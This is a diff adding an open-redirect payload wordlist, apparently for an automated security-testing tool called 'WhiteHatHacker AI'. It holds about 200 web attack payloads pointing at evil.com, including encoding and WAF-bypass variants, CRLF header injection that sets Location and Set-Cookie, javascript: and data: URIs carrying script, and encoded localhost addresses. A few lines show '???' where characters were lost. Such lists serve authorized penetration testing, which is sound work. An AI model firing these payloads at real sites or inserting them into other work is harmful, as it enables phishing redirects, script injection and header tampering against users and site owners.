@@ -1,0 +1,286 @@
+# ============================================================================
+# WhiteHatHacker AI — Open Redirect Payload Wordlist (Comprehensive)
+# Categories: Basic, Protocol-relative, Encoding, Double Encoding,
+#             Backslash, Whitespace, @ trick, Fragment, WAF Bypass
+# Total: ~200 payloads
+# ============================================================================
+
+# --- BASIC OPEN REDIRECT ---
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+https://evil.com/
+http://evil.com/
+//evil.com/
+
+# --- PROTOCOL RELATIVE ---
+//evil.com
+//evil.com/
+///evil.com
+///evil.com/
+////evil.com
+/////evil.com
+//evil.com/%2f..
+
+# --- BACKSLASH TRICKS ---
+/\evil.com
+\/evil.com
+/\/evil.com
+\\evil.com
+\evil.com
+//\\evil.com
+
+# --- @ SIGN TRICKS ---
+https://target.com@evil.com
+http://target.com@evil.com
+https://target.com%40evil.com
+http://evil.com%23@target.com
+https://evil.com%23@target.com
+//target.com@evil.com
+https://target.com%00@evil.com
+
+# --- DOT TRICKS ---
+https://evil.com%E3%80%82target.com
+evil.com%00.target.com
+evil.com%0d.target.com
+evil.com%0a.target.com
+https://target.com.evil.com
+
+# --- ENCODING VARIANTS ---
+%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d
+%2f%2f%65%76%69%6c%2e%63%6f%6d
+%2f%2fevil.com
+%2f%2f%65%76%69%6c%2e%63%6f%6d%2f
+%252f%252fevil.com
+%252f%252f%65%76%69%6c%2e%63%6f%6d
+%5cevil.com
+%5c%5cevil.com
+%68ttp://evil.com
+ht%74p://evil.com
+htt%70://evil.com
+htt%70%73://evil.com
+%0d%0aLocation:%20http://evil.com
+
+# --- DOUBLE ENCODING ---
+%252f%252fevil.com
+%252f%255cevil.com
+%25252f%25252fevil.com
+
+# --- WHITESPACE / NULL BYTE ---
+// evil.com
+//	evil.com
+//
+evil.com
+//%00evil.com
+//%0devil.com
+//%0aevil.com
+//%09evil.com
+//%20evil.com
+https://evil.com%00target.com
+https://evil.com%20%23target.com
+
+# --- FRAGMENT (#) TRICKS ---
+//evil.com#target.com
+//evil.com#@target.com
+https://evil.com#.target.com
+//target.com%23.evil.com
+
+# --- QUESTION MARK TRICKS ---
+//evil.com?target.com
+//evil.com?@target.com
+//target.com?redirect=//evil.com
+
+# --- PATH TRICKS ---
+/redirect/..//evil.com
+/.evil.com
+/evil.com/..;/target.com
+/evil.com%2f%2e%2e
+https://evil.com/target.com/../
+//evil.com/..;@target.com
+
+# --- CRLF + REDIRECT ---
+%0d%0aLocation: http://evil.com
+%0aLocation:%20http://evil.com
+%0d%0aLocation:%0d%0ahttp://evil.com
+%E5%98%8A%E5%98%8DLocation:http://evil.com
+
+# --- DATA URI ---
+data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9ldmlsLmNvbSI8L3NjcmlwdD4=
+data:text/html,<script>location="https://evil.com"</script>
+data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+
+
+# --- JAVASCRIPT PSEUDO-PROTOCOL ---
+javascript:window.location='https://evil.com'
+javascript:location.href='https://evil.com'
+javascript:document.location='https://evil.com'
+javascript://evil.com/%0aalert(1)
+javascript://target.com/%0d%0awindow.location='https://evil.com'
+
+# --- SUBDOMAIN BYPASS ---
+https://evil.target.com
+https://target.com.evil.com
+https://targetevilcom
+https://evil-target.com
+https://targetcom.evil.com
+https://target.com-evil.com
+
+# --- IP-BASED ---
+http://2130706433
+http://0x7f000001
+http://0177.0.0.1
+http://[::1]
+http://0
+http://127.1
+
+# --- MIXED CASE / SCHEME VARIATIONS ---
+HTTPS://evil.com
+hTTps://evil.com
+Https://Evil.com
+HTtp://evil.com
+htTP://evil.com
+hTtP://evil.com
+
+# --- DOMAIN CONFUSION ---
+https://evil。com
+https://evil%E3%80%82com
+https://evil．com
+https://evil。com/target
+
+# --- PARAMETER POLLUTION ---
+?next=//evil.com&next=//target.com
+?redirect=//evil.com&redirect=//target.com
+?url=//evil.com#&url=//target.com
+?return=//evil.com%23&return=//target.com
+
+# --- COMMON PARAMETER NAMES ---
+?redirect=https://evil.com
+?redirect_to=https://evil.com
+?redirect_url=https://evil.com
+?redir=https://evil.com
+?url=https://evil.com
+?next=https://evil.com
+?next_url=https://evil.com
+?return=https://evil.com
+?return_url=https://evil.com
+?returnTo=https://evil.com
+?return_to=https://evil.com
+?goto=https://evil.com
+?go=https://evil.com
+?target=https://evil.com
+?to=https://evil.com
+?link=https://evil.com
+?dest=https://evil.com
+?destination=https://evil.com
+?out=https://evil.com
+?view=https://evil.com
+?image_url=https://evil.com
+?continue=https://evil.com
+?window=https://evil.com
+?forward=https://evil.com
+?from_url=https://evil.com
+?r=https://evil.com
+?u=https://evil.com
+?checkout_url=https://evil.com
+?login_url=https://evil.com
+?logout=https://evil.com
+?callback=https://evil.com
+?page=https://evil.com
+?feed=https://evil.com
+?host=https://evil.com
+?site=https://evil.com
+?html=https://evil.com
+?data=https://evil.com
+?reference=https://evil.com
+?ref=https://evil.com
+
+# ============================================================================
+# EXPANSION: Advanced Open Redirect ??? Encoding, Protocol, Parser Bugs
+# ============================================================================
+
+# --- Protocol Confusion ---
+//evil.com
+///evil.com
+////evil.com
+/\/evil.com
+\/\/evil.com
+//evil.com/
+//evil.com/%2f..
+https:evil.com
+http:evil.com
+ftp://evil.com
+javascript:alert(1)//
+data:text/html,<script>alert(1)</script>
+//evil.com\@good.com
+//evil.com%00@good.com
+
+# --- URL Auth Confusion ---
+https://good.com@evil.com
+https://good.com%40evil.com
+https://good.com:password@evil.com
+//good.com:80%40evil.com
+//good.com%2f%2fevil.com
+
+# --- Encoding Variants ---
+%2f%2fevil.com
+%2F%2Fevil.com
+%252f%252fevil.com
+%5cevil.com
+%5c%5cevil.com
+%09//evil.com
+%0a//evil.com
+%0d//evil.com
+%20//evil.com
+%23//evil.com
+//evil%2ecom
+//evil???com
+//evil%E3%80%82com
+
+# --- Whitespace Tricks ---
+	//evil.com
+ //evil.com
+//evil.com
+//evil.com
+
+# --- Dot Tricks ---
+//evil.com/..%2f
+//evil.com/.good.com
+/evil.com/../good.com
+//evil.com%23.good.com
+//evil.com%3F.good.com
+
+# --- Fragment Injection ---
+//good.com#@evil.com
+//good.com%23@evil.com
+/?url=//evil.com#
+/?next=//evil.com#good.com
+
+# --- Parameter Pollution ---
+?redirect=//good.com&redirect=//evil.com
+?url=//good.com%0d%0aLocation:%20//evil.com
+?next=//good.com/%2f%2e%2e/evil.com
+?url=//good.com/redirect?url=//evil.com
+
+# --- Subdomain / Domain Tricks ---
+//evil.com.good.com
+//goodcom.evil.com
+//good.com.evil.com
+//evil-good.com
+https://good.com-evil.com
+//good.com@evil.com
+evil.com%252egood.com
+
+# --- IP-Based ---
+//0x7f000001
+//0177.0.0.1
+//[::1]
+//127.0.0.1
+//0
+//0.0.0.0
+//2130706433
+
+# --- CRLF in Redirect ---
+//evil.com%0d%0aSet-Cookie:malicious=1
+//evil.com%0d%0aX-Injected:true
+%0d%0aLocation://evil.com
